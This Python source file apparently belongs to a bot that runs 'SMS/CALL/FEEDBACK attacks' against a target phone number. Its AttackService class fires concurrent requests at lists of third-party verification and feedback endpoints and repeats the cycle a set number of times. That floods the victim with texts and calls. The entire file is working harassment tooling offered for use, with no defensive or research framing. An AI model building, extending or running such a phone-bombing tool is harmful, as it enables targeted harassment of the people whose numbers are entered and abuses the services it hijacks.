"""Attack service for executing SMS/CALL/FEEDBACK attacks."""
from dataclasses import dataclass
from time import perf_counter
from typing import Any

from aiohttp import ClientSession

from bot.services.attack_tools import email, user_agent
from bot.services.attack_urls import urls
from bot.services.feedback_urls import feedback_urls
from bot.services.universal_request_handler_v2 import UniversalRequestHandler


@dataclass
class AttackResult:
    """Result of an attack execution."""

    total_services: int
    successful: int
    failed: int
    unavailable_services: list[str]
    execution_time: float


class AttackService:
    """Service for executing attacks."""

    def __init__(self) -> None:
        """Initialize attack service."""
        self._use_feedback: bool = False
        self._attack_type: str = "SMS"

    def set_attack_config(self, use_feedback: bool, attack_type: str) -> None:
        """Set attack configuration.

        Args:
            use_feedback: Whether to use feedback services.
            attack_type: Type of attack (SMS, CALL, MIX, FEEDBACK).
        """
        self._use_feedback = use_feedback
        self._attack_type = attack_type

    async def _request(self, session: ClientSession, service: dict[str, Any]) -> bool:
        """Execute a single service request using universal handler v2.

        Args:
            session: HTTP session.
            service: Service configuration.

        Returns:
            True if request succeeded, False otherwise.
        """
        try:
            attack_types = (
                ("SMS", "CALL", "FEEDBACK")
                if self._attack_type == "MIX"
                else (self._attack_type,)
            )

            if service["info"]["attack"] not in attack_types:
                return False

            # Use universal request handler v2
            result = await UniversalRequestHandler.send_request(session, service)
            return result['success']
        except Exception:
            return False

    async def _execute_attack(
        self, session: ClientSession, phone_number: str
    ) -> AttackResult:
        """Execute a single attack cycle.

        Args:
            session: HTTP session.
            phone_number: Target phone number.

        Returns:
            Attack result with statistics.
        """
        services = (
            urls(phone_number) + feedback_urls(phone_number)
            if self._use_feedback
            else urls(phone_number)
        )

        start_time = perf_counter()
        results = await self._execute_services(session, services)
        execution_time = perf_counter() - start_time

        unavailable = [
            service["info"]["website"]
            for service, success in zip(services, results)
            if not success
        ]

        return AttackResult(
            total_services=len(services),
            successful=sum(results),
            failed=len(results) - sum(results),
            unavailable_services=unavailable,
            execution_time=execution_time,
        )

    async def _execute_services(
        self, session: ClientSession, services: list[dict[str, Any]]
    ) -> list[bool]:
        """Execute all services concurrently.

        Args:
            session: HTTP session.
            services: List of service configurations.

        Returns:
            List of boolean results for each service.
        """
        import asyncio

        tasks = [self._request(session, service) for service in services]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return [bool(r) if not isinstance(r, Exception) else False for r in results]

    async def execute_attack(
        self, phone_number: str, repeats: int
    ) -> AttackResult:
        """Execute multiple attack cycles.

        Args:
            phone_number: Target phone number.
            repeats: Number of attack cycles.

        Returns:
            Combined attack result with statistics.
        """
        total_successful = 0
        total_failed = 0
        total_unavailable: set[str] = set()
        start_time = perf_counter()
        services_per_attack = 0

        async with ClientSession() as session:
            for i in range(repeats):
                result = await self._execute_attack(session, phone_number)
                total_successful += result.successful
                total_failed += result.failed
                total_unavailable.update(result.unavailable_services)
                if i == 0:
                    services_per_attack = result.total_services

        execution_time = perf_counter() - start_time

        return AttackResult(
            total_services=services_per_attack,
            successful=total_successful,
            failed=total_failed,
            unavailable_services=list(total_unavailable),
            execution_time=execution_time,
        )
